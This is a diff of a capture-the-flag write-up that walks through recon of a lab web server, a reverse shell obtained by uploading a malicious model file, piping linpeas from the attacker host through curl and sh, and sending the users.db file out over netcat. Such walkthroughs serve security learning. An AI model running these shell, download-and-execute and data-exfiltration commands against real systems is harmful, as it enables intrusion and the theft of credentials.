@@ -1,4 +1,4 @@
-I find a webserver with nmap:
+I find a webserver with `nmap`:
 ```
 80/tcp open  http    nginx 1.18.0 (Ubuntu)
 | http-methods: 
@@ -7,7 +7,7 @@ I find a webserver with nmap:
 |_http-server-header: nginx/1.18.0 (Ubuntu)
 ```
 
-I also find a few paths with gobuster:
+I also find a few paths with `gobuster`:
 ```
 /dashboard            (Status: 302) [Size: 199] [--> /login]
 /logout               (Status: 302) [Size: 189] [--> /]
@@ -15,12 +15,12 @@ I also find a few paths with gobuster:
 /register             (Status: 200) [Size: 952]
 ```
 
-I get more informations with nikto:
+I get more informations with `nikto`:
 ```
 + HEAD nginx/1.18.0 appears to be outdated (current is at least 1.20.1).
 ```
 
-And even more informations with whatweb:
+And even more informations with `whatweb`:
 ```
 Summary   : HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], Matomo, nginx[1.18.0], Script
 ```
@@ -77,7 +77,7 @@ Cookie: session=eyJ1c2VyX2lkIjo3LCJ1c2VybmFtZSI6InJhbmRvbTQzMjEifQ.aJZgPw.oEFDyL
 Connection: keep-alive
 ```
 
-Once logged in, I also get a JWT token:
+Once logged in, I also get a `JWT token`:
 ```
 {
   "user_id": 7,
@@ -85,7 +85,7 @@ Once logged in, I also get a JWT token:
 }
 ```
 
-I decide to look at the dashboard source code:
+I decide to look at the dashboard `source code`:
 ```
 <main>
     <section class="dashboard-section">
@@ -110,13 +110,12 @@ I decide to look at the dashboard source code:
 ```
 
 
-I find 2 files, requirements.txt (python dependencies file):
+I find 2 files, `requirements.txt` (python dependencies file):
 ```
 tensorflow-cpu==2.13.1
 ```
 
-And a Dockerfile that download the same package during the build phase:
-static/Dockerfile content:
+And a `Dockerfile` that download the same package during the build phase:
 ```
 FROM python:3.8-slim
 
@@ -232,7 +231,7 @@ Content-Type: application/x-hdf
 ------WebKitFormBoundaryTicDHAyJc5Hia94Y--
 ```
 
-Then, I start a netcat listener:
+Then, I start a listener with `netcat`:
 ```
 nc -lvnp 4444
 listening on [any] 4444 ...
@@ -252,7 +251,7 @@ Cookie: session=eyJ1c2VyX2lkIjo4LCJ1c2VybmFtZSI6ImhhY2tlckBodGIuY29tIn0.aJ9_0w.t
 Connection: keep-alive
 ```
 
-The payload is executed and I get a connection on the netcat listener:
+The payload is executed and I get a connection on the `netcat` listener:
 ```
 connect to [10.10.14.9] from (UNKNOWN) [10.10.11.74] 56218
 /bin/sh: 0: can't access tty; job control turned off
@@ -270,9 +269,9 @@ drwxrwxr-x 4 app app 4096 Jun  9 13:57 static
 drwxrwxr-x 2 app app 4096 Jun 18 13:21 templates
 ```
 
-Once inside the box, I need to run linpeas.
+Once inside the box, I need to run `linpeas`.
 
-To do this, I first need to serve linpeas:
+To do this, I first need to serve `linpeas`:
 ```
 #!/bin/bash
 
@@ -286,14 +285,13 @@ wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
 sudo python3 -m http.server 8888
 ```
 
-Once that's done, I download linpeas on the box from my machine web server and run it from memory, sending the output my way:
+Once that's done, I transfer `linpeas` on the box using `curl`, then I send the output to my machine using `netcat`:
 ```
 nc -lvnp 9999 > linpeas.out # My machine
 curl 10.10.14.9:8888/linpeas.sh | sh | nc 10.10.14.9 9999 # Remote box
 ```
 
-I find some interesting informations.
-linpeas.out (shortened):
+I find some interesting informations:
 ```
 ╔══════════╣ Active Ports
 ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports
@@ -380,7 +378,7 @@ nc -lvp 9999 > users.db # My machine
 cat /home/app/app/instance/users.db | nc 10.10.14.9 9999 # Remote box
 ```
 
-Then, I open it:
+Then, I open it with `sqlite3`:
 ```
 $ sqlite3 users.db
 SQLite version 3.40.1 2022-12-28 14:03:47
